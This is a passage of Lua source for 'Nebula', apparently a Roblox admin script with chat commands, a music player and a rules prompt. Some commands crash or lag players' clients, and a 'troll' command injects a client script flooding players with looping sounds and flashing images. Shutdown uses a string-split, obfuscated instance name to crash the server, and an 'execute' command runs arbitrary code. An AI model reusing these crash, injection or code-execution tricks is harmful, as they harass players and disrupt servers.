      stop=true
      if global==false then getLocalSound(plr):Pause() else getGlobalSound():Pause() end
      pauseClicks=pauseClicks+1
      coroutine.wrap(function()
        for i = 1,(5/wait()) do
          wait()
          if pauseClicks>=2 then break end
        end
        if pauseClicks>=2 then
          pauseClicks=0
          stop=true
          if global==false then
            getLocalSound(plr):Stop()
            getLocalSound(plr).Pitch=100
            getLocalSound(plr).Volume=0
          else
            getGlobalSound():Stop()
            getGlobalSound().Pitch=100
            getGlobalSound().Volume=0
          end
        end
      end)()
    end)
    plyB.MouseButton1Click:connect(function()
      stop=true
      if (global==false and (getLocalSound(plr).IsPlaying==false or getLocalSound(plr).IsPaused==true) or global==true and (getGlobalSound().IsPlaying==false or getGlobalSound().IsPaused==true) ) then
        if global==false then
          getLocalSound(plr):Play()
          getLocalSound(plr).Pitch=1
          getLocalSound(plr).Volume=.5
        else
          getGlobalSound:Play()
          getGlobalSound.Pitch=1
          getGlobalSound.Volume=.5
        end
      end
      stop=false
    end)
    rstrtB.MouseButton1Click:connect(function()
      stop=true
      if global==false then getLocalSound(plr):Play() else getGlobalSound():Play() end
      stop=false
    end)
    coroutine.wrap(function()
      while true do
        if stop==true then
          wait()
        else
          if global==false and (getLocalSound(plr).IsPlaying==false or getLocalSound(plr).IsPaused==true) or global==true and (getGlobalSound().IsPlaying==false or getGlobalSound().IsPaused==true) then
            nextSong()
            if global==false then
              getLocalSound(plr):Stop()
              getLocalSound(plr):Play()
            else
              getGlobalSound():Stop()
              getGlobalSound():Play()
            end
          else
            wait()
          end
        end
      end
    end)()
  else
    plrgui.NebulaMusic.MusicBg.Visible=true
  end
end

function showRules(plr)
  local plrgui = plr:findFirstChild("PlayerGui")
  if not plrgui then plrgui = Instance.new("PlayerGui",plr) end
  local g = Instance.new("ScreenGui",plrgui)
  g.Name='Rules'
  local bg = Instance.new("Frame",g)
  bg.Name='RulesBg'
  bg.BackgroundTransparency=.25
  bg.BackgroundColor3=Color3.new()
  bg.BorderColor3=Color3.new(1,1,1)
  bg.Size=UDim2.new(1,0,1,0)
  local co = Instance.new("ScrollingFrame",bg)
  co.Name='Rules'
  co.BackgroundColor3=Color3.new(1,1,1)
  co.BorderColor3=Color3.new(1,0,0)
  co.Position=UDim2.new(.1,0,.16,0)
  co.Size=UDim2.new(.8,0,.69,0)
  co.CanvasSize=UDim2.new(0,0,(0.05*#rules),0)
  local agb = Instance.new("TextButton",bg)
  agb.Name='Agree'
  agb.Position=UDim2.new(.2,0,.9,0)
  agb.Size=UDim2.new(.2,0,.05,0)
  agb.Style='RobloxButtonDefault'
  agb.Font="Arial"
  agb.FontSize='Size18'
  agb.Text="I Agree"
  agb.TextColor3=Color3.new(1,1,1)
  agb.TextWrapped=true
  local dgb = Instance.new('TextButton',bg)
  dgb.Name='Disagree'
  dgb.Position=UDim2.new(.6,0,.9,0)
  dgb.Size=UDim2.new(.2,0,.05,0)
  dgb.Style='RobloxButtonDefault'
  dgb.Font='Arial'
  dgb.FontSize='Size18'
  dgb.Text='I Disagree'
  dgb.TextColor3=Color3.new(1,1,1)
  dgb.TextWrapped=true
  for i,v in pairs(rules) do
    local rg = Instance.new("TextLabel",co)
    rg.Name='RuleText'
    rg.BackgroundTransparency=1
    rg.Size=UDim2.new(1,0,.05,0)
    rg.Position=UDim2.new(0,0,(#co:GetChildren()-1)*.05,0)
    rg.Font='Arial'
    rg.Text=v
    rg.TextColor3=Color3.new()
    rg.TextScaled=true
    rg.TextWrapped=true
    rg.TextXAlignment='Left'
  end
  dgb.MouseButton1Click:connect(function() plr:Kick() end)
  agb.MouseButton1Click:connect(function() g:Destroy() getPS(plr).AgreedToRules=true end)
end

function checkAge(plr)
  if ageRestriction.Enabled==true then
    if plr.AccountAge<ageRestriction.MinAge and not parseRrank(plr,1) then
      plr:Kick()
      broadcast(plr.Name .. ' has been kicked due to age restriction.', Color3.new(1,0,0),nil,nil,3)
    end
  end
end

function CheckPri(plr)
    local found
    for i,v in pairs(pri.Allowed) do
        if tostring(v:lower())==plr.Name:lower() then found=true end
    end
    
  if pri.Active == true and not parseRank(plr,0) and not found then
    
    local input
  
  if not plr.Character and not pri.Banned[plr.Name] then
      for i,v in pairs(services.players:GetPlayers()) do
        if parseRank(v,1) then
        coroutine.wrap(function()
        newTablet(v,"Would you like to let " .. plr.Name .. " enter the server?")
          local input2 = inputTablet(v,{{"Yes",Color3.new(0,1,0)},{"No",Color3.new(1,0,0)}})
          if input2[1]=="Yes" then
            input=true
            cmds(v,"dt;")
          else
            input=false
            pri.Banned[plr.Name]=true
            cmds(v,"dt;")
          end
          end)()
      end
      end
    else input=false end
    
    repeat wait() until type(input)=='boolean'
    
    if input==false then
      local TheType = pri.Type:lower()
      if TheType == "crash" then
        pcall(function() crash(plr) end)
        wait()
        pcall(function() plr:Kick() end)
        broadcast(plr.Name.." has been crashed due to pri",Color3.new(1,0,0),nil,nil,3)
      elseif TheType == "kick" then
        pcall(function() plr:Remove() end)
        pcall(function() Game:GetService("Debris"):AddItem(plr, 0) end)
        broadcast(plr.Name.." has been kicked due to pri",Color3.new(1,0,0),nil,nil,3)
      elseif TheType == "lag" then
        pcall(function() lag(plr) end)
        wait()
        pcall(function() plr:Kick() end)
        broadcast(plr.Name.." has been lag due to pri",Color3.new(1,0,0),nil,nil,3)
      end
    else
      pri.respawn(plr)
    end
  
  else
    if not plr.Character then pri.respawn(plr) end
  end
end

function onPlayerAdded(plr)
    if not getPS(plr) then setPS(plr) end
    if getRank(plr)==nil then setRank(plr,syncRank(plr)) end
      startTabletCFrame(plr)
      checkBan(plr)
      CheckPri(plr)
      checkAge(plr)
      if not getPS(plr).AgreedToRules then
        if not parseRank(plr,1) then showRules(plr)
        else getPS(plr).AgreedToRules=true end
      end
      if scriptingCompatability.localscript then
        if not plr.PlayerGui then Instance.new("PlayerGui",plr) end
        _ns(plr.PlayerGui,true,clientSource)
      else
        table.insert(nebulaClientQuee,plr)
      end
      if parseRank(plr,1) then
        antiLocal(plr)
      end
      showLogo(plr)
      plr.Chatted:connect(function(m)
         if not parseRank(plr, 1) and CheckWord(m) == true and filteractive == true then
           pcall(function() crash(plr) end)
           wait()
           pcall(function() Game:GetService("Debris"):AddItem(plr, 0.5) end)
           broadcast(plr.Name.." has been crashed for chatting filtered word!",Color3.new(1,0,0),nil,nil,3)
         end
      end)
      if parseRank(plr,1) and pri.Active==false then notificationTablet(plr,"Nebula revision " .. ver .. " is running.",Color3.new(0,1,0),nil,nil,3) end
      plr.Chatted:connect(function(m)
            pcall(function() ChatFix(m,plr) end)
      end)
      chatconnections[plr.Name] = plr.Chatted:connect(function(msg)
        pcall(function() ypcall(function() onChatted(plr,msg) end) end)
      end)
      plr.CharacterAdded:connect(function(char)
        onCharacterAdded(char,plr)
      end)
end

function onPlayerRemoving(plr)
  local cachedName=plr.Name
  repeat wait() until not plr or (not plr.Parent)
  for i,v in pairs(services.network:GetChildren()) do
    if v:IsA("ServerReplicator") and ( v:GetPlayer()==plr or v:GetPlayer().Name==cachedName ) then
      broadcast(cachedName .. ' is watching you in nil! Click to bring up net;', Color3.new(0,0,1), 'net;',nil,3)
    end
  end
end

function getNilPlayers()
  local result = {}
  for i,v in pairs(services.network:GetChildren()) do
    if v:IsA("ServerReplicator") and v:GetPlayer().Parent~=game:GetService("Players") then
      table.insert(result,v)
    end
  end
  return result
end

-- Command Support --
function findPlayer(name,plr,isModel)
 name=name:lower()
  local result = {}
  local split = name:find(" ")
  if split then
    if name:sub(1,1)~=" " then name=" "..name end
    for name1 in name:gmatch(" (%w+)") do
      for i,v in pairs(findPlayer(name1,plr,isModel)) do table.insert(result,v) end
    end
    return result
  end
  if not isModel then
    if name=="me" then return {plr}
    elseif name == "random" then
      local plrs = Game:GetService("Players"):GetPlayers()
      table.insert(result, plrs[math.random(0,#plrs)])
    elseif name=="others" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v~=plr then table.insert(result,v) end
      end
    elseif name=="all" then return game:GetService("Players"):GetPlayers()
    elseif name=="guests" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if getRank(v)==0 then table.insert(result,v) end
      end
    elseif name=="members" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if getRank(v)==1 then table.insert(result,v) end
      end
    elseif name=="staff" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if parseRank(v,1) then table.insert(result,v) end
      end
    elseif name=="friends" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if plr:IsFriendsWith(v.userId) then table.insert(result,v) end
      end
    elseif name=="nonfriends" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if not plr:IsFriendsWith(v.userId) then table.insert(result,v) end
      end
    elseif name=="bestfriends" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if plr:IsBestFriendsWith(v.userId) then table.insert(result,v) end
      end
    elseif name=="nonbestfriends" then
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if not plr:IsBestFriendsWith(v.userId) then table.insert(result,v) end
      end
    else
      for i,v in pairs(game:GetService("Players"):GetPlayers()) do
        if v.Name:lower():find(name) then table.insert(result,v) end
      end
    end
  else
    for i,v in pairs(Workspace:GetChildren()) do
      if v:IsA("Model") then
        if v.Name:lower():find(name) then table.insert(result,v) end
      end
    end
  end
  return result
end

function ChatFix(msg,p)
  if p == nil or type(p) ~= "userdata" then return end
  local plrname = tostring(p.Name)
  if msg == (commands.settings.prefix and commands.settings.prefix or '') .. "fix" .. commands.settings.middlix .. (commands.settings.suffix and commands.settings.suffix or '') then
    for l,v in pairs(chatconnections) do
      if v == plrname then
        v:disconnect()
      end
    end
    chatconnections[plrname] = p.Chatted:connect(function(msg)
      onChatted(p,msg)
    end)
    notificationTablet(p,"Fixed your chat connection.",Color3.new(0,0,1),nil,nil,5)
  end
end

function checkCommand(target,executer,command,equal)
  if parseRank(executer,target,equal) or target==executer then return true
  else notificationTablet(target,executer.Name .. ' has tried to preform command ' .. command .. ' on you.',Color3.new(1,0,0), nil, nil, 10) newTablet(executer, target.Name .. ' outranks you!',Color3.new(1,0,0)) return false end
end
-- Rules --
local rulesRaw=services.http:GetAsync('https://raw.githubusercontent.com/Basscans/Nebula/master/Rules',true)
for rule in string.gmatch(rulesRaw,'([%w%p ]+)\n') do
  rule=rule:gsub("\\127",'\127')
  table.insert(rules,rule)
end
 
-- Load --
syncBans(true)
syncPri(true)

for i,v in pairs(game:GetService("Players"):GetPlayers()) do
  onPlayerAdded(v)
end
game:GetService("Players").PlayerAdded:connect(onPlayerAdded)
game:GetService("Players").PlayerRemoving:connect(onPlayerRemoving)

for i,v in pairs(getNilPlayers()) do
  pcall(function()
    broadcast(v:GetPlayer().Name .. ' is watching you in nil! Click to bring up net;', Color3.new(0,0,1), 'net;',nil,3)
  end)
end

-- Load Commands --
-- Commands --
-- name,shortname,desc,rank,args,tags,useTags,func
newCmd("troll","trl","Trolls the player",2,{"Player name"},nil,false,function(plr,args)
  local targets = findPlayer(args[1], plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'troll') then
      local par = v.Character or v:findFirstChild("Backpack") or v:findFirstChild("PlayerGui")
      _ns(par,true,[[
        local LocalPlayer = Game:GetService("Players")["LocalPlayer"]
        local Camera = Workspace:findFirstChild("Camera")
        local PlayerGui = LocalPlayer:findFirstChild("PlayerGui")
        local ScreenGui = Instance.new("ScreenGui",PlayerGui)
        local Asset = "http://www.roblox.com/asset/?id="
        local Assets = {154664102,123968061}
        local soundplyin = nil
        Game:GetService("StarterGui"):SetCoreGuiEnabled(4, false)
      for _, i in ipairs(Assets) do
         Game:GetService("ContentProvider"):Preload(Asset .. tostring(i))
      end
        for i = 0,50,1 do
          local sound = Instance.new("Sound",Camera)
          sound.SoundId = Asset.."154664102"
          sound.Looped=true
          sound:Play()
          soundplyin = sound
        end
        coroutine.wrap(function()
      for i=1,700 do
        wait()
        pcall(function()
          local Cam = Workspace:findFirstChild("Camera",true)
          Cam.CameraType = "Scriptable"
          Cam.FieldOfView = Cam.FieldOfView + math.random(-5,5)
          Cam.CameraType = "Scriptable"
          Cam:SetRoll(Cam:GetRoll()+0.01)
        end)
      end
    end)()
        for i = 0,500 do
          local ImageLabel = Instance.new("ImageLabel",ScreenGui)
          ImageLabel.Image = Asset.."84204730"
          ImageLabel.Position = UDim2.new(0,math.random(-100,1250),0,math.random(-100,1250))
          ImageLabel.Size = UDim2.new(0,200,0,200)
          ImageLabel.BackgroundTransparency=1
          coroutine.wrap(function()
            while wait(.25) do
              ImageLabel.Position=UDim2.new(math.random(100)/100,0,math.random(100)/100,0)
              ImageLabel.BackgroundTransparency=math.random(10)/10
              ImageLabel.BackgroundColor3=BrickColor.Random().Color
              ImageLabel.BorderColor3=Color3.new()
            end
          end)()
          wait()
        end
        local Text = Instance.new("TextLabel",ScreenGui)
        Text.Text = "TROLL"
      Text.Name = "Label"
      Text.Font = "ArialBold"
      Text.TextColor3 = BrickColor.Random().Color
      coroutine.wrap(function()
        while wait(.2) do Text.TextColor3 = BrickColor.Random().Color end
      end)()
      Text.FontSize = "Size36"
      Text.BackgroundTransparency = 1
      Text.TextStrokeTransparency = 0.5
      Text.Size = UDim2.new(1,0,1,0)
        local Camera = Workspace:findFirstChild("Camera",true)
        wait(3)
        Camera:SetRoll(0)
      Camera.CameraType = "Custom"
      Camera.FieldOfView = 70
      Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
      Camera:ClearAllChildren()
        LocalPlayer.Character:BreakJoints()
        Game:GetService("StarterGui"):SetCoreGuiEnabled(4, true)
      ]])
    end
  end
end)
newCmd("afk","brb","Shows that the player is afk",1,{},{},true,function(plr,args)
  for __, tab in pairs(getTablets(plr)) do
    tab:Destroy()
  end
  for i = 0,10,1 do
  newTablet(plr,tostring(plr.Name).." is AFK.",Color3.new(1,0,0))
  wait()
  end
   for i,v in pairs(plr.Character:GetChildren()) do
   pcall(function() v.Transparency=.5 end)
    end
   Instance.new("ForceField",plr.Character)
   local previousTeamColor=plr.TeamColor
   local previousNeutral=plr.Neutral
   plr.Character.Humanoid.MaxHealth=math.huge
   plr.TeamColor=BrickColor.new(Color3.new())
   plr.Neutral=false
  local input = inputTablet(plr,{{"Back",Color3.new(0,1,0)}})
  if input[1]=="Back" then
    pcall(function() nebServ.idleList[plr.Name]=nil end)
    plr.Character.Humanoid.Health=100
    plr.Character.Humanoid.MaxHealth=100
    plr.TeamColor=previousTeamColor
    plr.Neutral=previousNeutral
    for i,v in pairs(plr.Character:GetChildren()) do
      if v:IsA("ForceField") then v:Destroy() end
    end
    for i,v in pairs(plr.Character:GetChildren()) do pcall(function() v.Transparency=0 end) end
      cmds(plr,"dt;")
  end
    pcall(function() plr.Character.HumanoidRootPart.Transparency=1 end)
end)

newCmd("music","msc","Brings up the music player",1,{},{'-g (global)'},true,function(plr,args,tags)
  if not tags[1] then
    showMusicGui(plr,false)
  else
    if parseRank(plr,1) then
      showMusicGui(plr,true)
    else
      notificationTablet(plr,'Your rank is too low to do this',Color3.new(1,0,0),nil,nil,5)
    end
  end
end)

newCmd("time","tod","Changes the time of day",1,{},{},false,function(plr,args)
  if args[1] then
    local nm = tonumber(args[1]) or 12
    local lighting = Game:GetService("Lighting")
    local m = tostring(args[1]):lower()
    if m == "day" then
      lighting.TimeOfDay = 8
    elseif m == "night" then
      lighting.TimeOfDay = 0
                elseif m == "cool" then
                        lighting.TimeOfDay = 28
    elseif m == "midday" then
      lighting.TimeOfDay = 12
    else
      lighting.TimeOfDay = nm
    end
  end
end)

newCmd("god","gd","Gods the player",2,{"Player name"},{"-u (un)"},true,function(plr,args,tags)
  local targets = findPlayer(args[1], plr)
  for i,v in pairs(targets) do
    local hum = v.Character:findFirstChild("Humanoid",true)
    if tags[1] == "u" and v.Character and hum then
      hum.MaxHealth = 100
    elseif not tags[1] and v.Character and hum then
      hum.MaxHealth=math.huge
    end
  end
end)
newCmd("walkspeed","ws","Sets the players walkspeed",1,{"Player name","Speed"},{},false,function(plr,args)
  if args[1] and args[2] then
    local targets = findPlayer(args[1],plr)
    for i,v in pairs(targets) do
      local hum = v.Character:findFirstChild("Humanoid",true)
      if v.Character and hum then
        hum.WalkSpeed=tonumber(args[2])
      end
    end
  else
    notificationTablet(plr,"Not enough arguments",Color3.new(1,0,0),nil,nil,5)
  end
end)
newCmd("asset","ast","Gives the player the asset",1,{"Player name","Asset"},{},false,function(plr,args)
  if args[1] and args[2] then
    local targets = findPlayer(args[1],plr)
    for i,v in pairs(targets) do
      if v.Character then
        local item = Game:GetService("InsertService"):LoadAsset(tonumber(args[2]))
        if item == nil or #item:GetChildren() <= 0 then
          notificationTablet(plr,"Asset nil!",Color3.new(1,0,0),nil,nil,5)
        else
          for l,p in pairs(item:GetChildren()) do 
            if p:IsA("Tool") or p:IsA("HopperBin") then
              p.Parent=v.Backpack
            elseif p:IsA("Decal") then
              if p.Name=="face" then
                p.Parent=v.Character.Head
              end
            elseif p:IsA("Shirt") then
              pcall(function() p.Shirt:Destroy() end)
              p.Parent=v.Character
            elseif p:IsA("Pants") then
              pcall(function() p.Pants:Destroy() end)
              p.Parent=v.Character
            elseif p:IsA("ShirtGraphic") then
              pcall(function() p["T-Shirt"]:Destroy() end)
              p.Parent=v.Character
            end
          end
        end
      else
        notificationTablet(plr,"No character!",Color3.new(1,0,0),nil,nil,5)
      end
    end
  else
    notificationTablet(plr,"Not enough arguments",Color3.new(1,0,0),nil,nil,5)
  end
end)
newCmd("filter","flt","toggles the filter",3,nil,{"-on","-off"},true,function(plr,args,tags)
  if tags[1] == "on" then
    newTablet(plr, "Turned the chat filter on.",Color3.new(0,1,0))
    filteractive = true
  elseif tags[1] == "off" then
    newTablet(plr, "Turned the chat filter off.",Color3.new(1,0,0))
    filteractive = false
  else
    if filteractive == true then
      newTablet(plr,"Turned the chat filter off.",Color3.new(1,0,0))
      filteractive = false
    else
      newTablet(plr,"Turned the chat filter on.",Color3.new(0,1,0))
      filteractive = true
  end
  end
end)
newCmd("shutdown","sd","shuts the server down",5,nil,{"-a (abort)"},true,function(plr,args,tags)
  if not tags[1] then
    for i = 10,1,-1 do
       broadcast("Server shutting down in " .. i .. " second(s).",Color3.new(1,0,0),nil,nil,1)
        wait(1)
        if abortShutdown then break end
      end
    while not abortShutdown do
      for i,v in pairs(Game:GetService("Players"):GetPlayers()) do
        pcall(function() v:Kick() end)
      end
      pcall(function() Spawn(wait) end)
      pcall(function() Instance.new("Manua".."lSur".."faceJ".."ointI".."nstance",Workspace) end)
    wait()
    end
    abortShutdown=false
  elseif tags[1]=='a' then
    abortShutdown=true
  end
end)

newCmd("Message","m","Messages server",1,{"Text"},{"-s (static)","-c (classic)"},true,function(plr,args,tags)
  args=args.default
  if not args then
    notificationTablet(plr,"Please specify the text for the message.",Color3.new(1,0,0))
  elseif not tags[1] then
    for i,v in pairs(game:GetService("Players"):GetPlayers()) do
      coroutine.wrap(function(v)
        if not v:findFirstChild("PlayerGui") then Instance.new("PlayerGui",v) end
        local g = Instance.new("ScreenGui",v.PlayerGui)
        g.Name="Message"
        local bg = Instance.new("Frame",g)
        bg.BackgroundColor3=Color3.new()
        bg.BackgroundTransparency=.5
        bg.BorderColor3=Color3.new(1,1,1)
        bg.Size=UDim2.new(1,0,1,0)
        bg.Name="Bg"
        bg.Position=UDim2.new(-1,0,0,0)
        local label = Instance.new("TextLabel",bg)
        label.BackgroundTransparency=1
        label.Name="Label"
        label.Size=UDim2.new(1,0,.1,0)
        label.Font="SourceSansBold"
        label.TextColor3=Color3.new(128/255,128/255,128/255)
        label.TextScaled=true
        label.TextWrapped=true
        label.TextStrokeColor3=Color3.new(1,1,1)
        label.TextStrokeTransparency=0
        label.Text="| System Message |"
        local txt = Instance.new("TextLabel",bg)
        txt.BackgroundTransparency=1
        txt.Name="Text"
        txt.Size=UDim2.new(1,0,.9,0)
        txt.Position=UDim2.new(0,0,.1,0)
        txt.Font="ArialBold"
        txt.TextColor3=Color3.new(128/255,128/255,128/255)
        txt.TextScaled=true
        txt.TextWrapped=true
        txt.TextStrokeColor3=Color3.new(1,1,1)
        txt.TextStrokeTransparency=0
        txt.Text=NoFilter(table.concat(args,","))
          
        bg.Visible=false
         txt.Visible=false
         label.Visible=false
         
        txt.TextStrokeTransparency=1
        txt.TextTransparency=1
        label.TextStrokeTransparency=1
        label.TextTransparency=1
        
        bg.Visible=true
        bg:TweenPosition(UDim2.new(0,0,0,0),"In","Sine",1)

        wait(1)
    bg.Position=UDim2.new(0,0,0,0) -- just in case
        wait(.5)
    
    txt.Visible=true
    label.Visible=true
        for i = 100,0,-5 do
          txt.TextTransparency=i/100
          txt.TextStrokeTransparency=i/100
          label.TextTransparency=i/100
          label.TextStrokeTransparency=i/100
          wait()
        end
        wait((#table.concat(args,","))*0.125)
        for i = 0,100,5 do
          txt.TextTransparency=i/100
          txt.TextStrokeTransparency=i/100
          label.TextTransparency=i/100
          label.TextStrokeTransparency=i/100
          wait()
        end
          bg:TweenPosition(UDim2.new(1,0,0,0),"Out","Quart",.5)
          wait(.5)
          g:Destroy()
      end)(v)
    end
  elseif tags[1]=="s" then
    local m = Instance.new("Message",Workspace)
    m.Text="| System Message |\n\n" .. table.concat(args,",")
  elseif tags[1]=="c" then
    local m = Instance.new("Message",Workspace)
    m.Text="| System Message |\n\n" .. table.concat(args,",")
    game:GetService("Debris"):AddItem(m,(#table.concat(args,",")*.125))
  end
end)
newCmd("hint","h","Hints server",1,{"Text"},{"-s (static)","-c (classic)"},true,function(plr,args,tags)
  args=args.default
  if not args[1] then
    notificationTablet(plr,"Please specify the text for the hint.",Color3.new(1,0,0))
  elseif not tags[1] then
    for i,v in pairs(services.players:GetPlayers()) do
      coroutine.wrap(function()
        if not v:findFirstChild("PlayerGui") then Instance.new("PlayerGui",v) end
        local g = Instance.new("ScreenGui",v.PlayerGui)
        g.Name="Hint"
        local bg = Instance.new("Frame",g)
        bg.BackgroundColor3=Color3.new()
        bg.BackgroundTransparency=.5
        bg.BorderColor3=Color3.new(1,1,1)
        bg.Name="Bg"
        bg.Size=UDim2.new(1,0,0.05,0)
        bg.Visible=false
        local txt = Instance.new("TextLabel",bg)
        txt.BackgroundTransparency=1
        txt.Name="Text"
        txt.Size=UDim2.new(1,0,1,0)
        txt.Font="ArialBold"
        txt.TextColor3=Color3.new(128/255,128/255,128/255)
        txt.TextScaled=true
        txt.TextWrapped=true
        txt.TextStrokeColor3=Color3.new(1,1,1)
        txt.TextStrokeTransparency=0
        txt.Text=plr.Name .. ": " .. NoFilter(table.concat(args,","))
        
        bg.Position=UDim2.new(-1,0,0,0)
          
        txt.Visible=false
        txt.TextStrokeTransparency=1
        txt.TextTransparency=1
          
        bg.Visible=true
        bg:TweenPosition(UDim2.new(0,0,0,0),"In","Sine",1)
        wait(1)
        bg.Position=UDim2.new(0,0,0,0) -- just in case
        wait(.5)
        txt.Visible=true
        for i = 100,0,-5 do
          txt.TextTransparency=i/100
          txt.TextStrokeTransparency=i/100
          wait()
        end
        wait((#table.concat(args,","))*0.125)
        for i = 0,100,5 do
          txt.TextTransparency=i/100
          txt.TextStrokeTransparency=i/100
          wait()
        end
            bg:TweenPosition(UDim2.new(1,0,0,0),"Out","Quart",.5)
            wait(.5)
            g:Destroy()
      end)()
    end
  elseif tags[1]=="s" then
    local h = Instance.new("Hint",Workspace)
    h.Text=plr.Name .. ": " .. table.concat(args,",")
  elseif tags[1]=="c" then
    local h = Instance.new("Hint",Workspace)
    h.Text=plr.Name .. ": " .. table.concat(args,",")
    game:GetService("Debris"):AddItem(h,(#table.concat(args,",")*.125))
  end
end)
newCmd("execute","exe","Execute the args",7,{},{},false,function(plr,args) 
    local toExe = table.concat(args.default, ',')
    local a = loadstring(toExe)
    local handle = function(err)
       newTablet(plr, "[ERROR]: "..tostring(err),Color3.new(1,0,0)) 
    end
    coroutine.wrap(function()
        xpcall(a, handle)
    end)()
end)

newCmd("forcefield","ff","Gives someone a forcefield", 1,{"Player Name"},{"-u (unff)"},true,function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
      if tags[1] == "u" then
        for _,i in pairs(v.Character:GetChildren()) do
          if i.ClassName=="ForceField" then
            i:Remove()
          end
        end
      elseif v.Character ~= nil then
        Instance.new("ForceField",v.Character)
      end
    end
end)
newCmd("rejoin","rj","Rejoins someone", 2, {"Player Name"}, {}, false, function(plr,args)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'rejoin',true) then
     Game:GetService("TeleportService"):Teleport(Game.PlaceId, v)
    end
  end
end)  
newCmd("scriptlog","slog","shows the script log or clears scripts",3,{"Arguments"},{"-l (LocalScripts)","-s (normalscripts)","-a (all)","-c (clear)","-r (remove all)"}, true, function(plr,args,tags)
  if tags[1]=="l" then
    for i,v in pairs(scriptlog) do
      if v.ClassName == "LocalScript" then
        newTablet(plr,v.Name.." | "..v.ClassName,Color3.new(0,1,0))
      end
    end
  elseif tags[1]=="s" then
    for i,v in pairs(scriptlog) do
      if v.ClassName == "Script" then
        newTablet(plr,v.Name.." | "..v.ClassName,Color3.new(0,1,0))
      end
    end 
  elseif tags[1]=="all" then
    for i,v in pairs(scriptlog) do
        newTablet(plr,v.Name.." | "..v.ClassName,Color3.new(0,1,0))
    end
  elseif tags[1]=="c" then
    scriptlog = {}
    newTablet(plr, "Script log cleared",Color3.new(0,0,1))
  elseif tags[1]=="r" then
    for i,v in pairs(scriptlog) do
      coroutine.wrap(function()
        repeat
          v.Disabled=true
          v.Name="NebularRemovedScript"
          v:ClearAllChildren()
          v.Parent=nil
          wait()
        until v.Disabled==true and v.Parent==nil
        v:Remove()
      end)()
      scriptlog[i]=nil
    end
    scriptlog={}
    newTablet(plr, "Attempted to remove all scripts",Color3.new(1,0,0))
  else
    for i,v in pairs(scriptlog) do
        newTablet(plr,v.Name.." | "..v.ClassName,Color3.new(0,1,0))
    end
  end  
end)
newCmd("chatlog","cl","Displays the chat log", 2, {"Clear"}, {"-c (clears the chatlog)","-s (system","-f (find"},  true, function(plr,args,tags)
  if tags[1] == "c" then
    chatlog = {}
    newTablet(plr, "The chat log has been cleared.",Color3.new(0,0,1))
  elseif tags[1] == "s" then
    if #chatlog == 0 then newTablet(plr, "No chat logs.",Color3.new(1,0,0))
    else
      for i,v in pairs(chatlog) do
        if v.Name == "SYSTEM" then
          newTablet(plr, v.Name..": "..v.Message, Color3.new(0,1,0))
        end
      end
    end
  elseif tags[1] == "f" and args[1] then
    local msg = tostring(args[1]):lower()  
    if #chatlog == 0 then newTablet(plr, "No chat logs.",Color3.new(1,0,0))
    else
      for i,v in pairs(chatlog) do
        if string.find(v.Name:lower(), msg) then
          newTablet(plr, v.Name..": "..v.Message, Color3.new(0,1,0))
        end
      end
    end
  else
    if #chatlog == 0 then newTablet(plr, "No chat logs.",Color3.new(1,0,0))
    else
      for i,v in pairs(chatlog) do
        newTablet(plr, v.Name..": "..v.Message, Color3.new(0,1,0))
      end
    end
  end
end)
newCmd("kill","kl","Kills someone.", 1, {"Player Name"}, {"-l (loop)", "-r (respawn)","-e (explode)", "-d (destroy)", "-hd (head destroy)", "-td (torso destroy)", "-hr (head rename)"}, true, function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'kill') then
      if not tags[1] then pcall(function() v.Character:BreakJoints() end)
      elseif tags[1]=='r' then pcall(function() v:LoadCharacter() end)
      elseif tags[1]=='e' then
        pcall(function()
          local e = Instance.new("Explosion",Workspace)
          e.Position=v.Character.Torso.CFrame.p
        end)
      elseif tags[1]=='d' then pcall(function() v.Character:Destroy() end)
      elseif tags[1]=='hd' then pcall(function() v.Character.Head:Destroy() end)
      elseif tags[1]=='td' then pcall(function() v.Character.Torso:Destroy() end)
      elseif tags[1]=="hr" then pcall(function() v.Character.Head.Name=math.random() end)
      elseif tags[1]=='l' then
        if not loopkill[v.Name] then loopkill[v.Name]=_ns(v.Character,true, [[script.Parent=nil while wait() do pcall(function() game:GetService("Players").LocalPlayer.Character:BreakJoints() end) end]])
        else loopkill[v.Name].Parent=Workspace loopkill[v.Name].Disabled=true loopkill[v.Name]:Destroy() loopkill[v.Name]=nil end
      end
      newTablet(plr,"Killed " .. v.Name.. ".",Color3.new(0,1,0))
    end
  end
end)
newCmd("respawn","rs","Respawns someone.", 1, {"Player Name"}, {}, false, function(plr,args)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'respawn') then
      pcall(function() v:LoadCharacter() end)
      newTablet(plr,"Respawned " .. v.Name..".",Color3.new(0,1,0))
    end
  end
end)
newCmd("explode", "exp", "Explodes someone.",1,{"Player Name"}, {"-nd (No damage)"}, true, function(plr,args,tags)
  local targets = findPlayer(args[1],plr)
  for i,v in pairs(targets) do
    if checkCommand(v,plr,'explode') then
      if not tags[1] then
        pcall(function()
          local e = Instance.new("Explosion",Workspace)
          e.Position=v.Character.Torso.CFrame.p
        end)
      else
        pcall(function()
          local e = Instance.new("Explosion",Workspace)
          e.Position=v.Character.Torso.CFrame.p
          e.BlastRadius=0
          e.BlastPressure=0
          e.ExplosionType='NoCraters'
          v.Character:BreakJoints()
        end)
      end
      newTablet(plr,"Exploded " .. v.Name..".",Color3.new(0,1,0))
    end
  end
end)
newCmd("moonshade","death","Morphes you into death.",2,{},{},1,function(plr,args)
  if plr.Character then
    local char = plr.Character
    local item = Game:GetService("InsertService"):LoadAsset(108149175)
    local head = char:findFirstChild("Head",true)
    pcall(function()
      char:findFirstChild("roblox",true).Texture="http://www.roblox.com/asset/?version=1&id=1028594"
    end)
    if head then
      local headmesh = Instance.new("SpecialMesh",head)
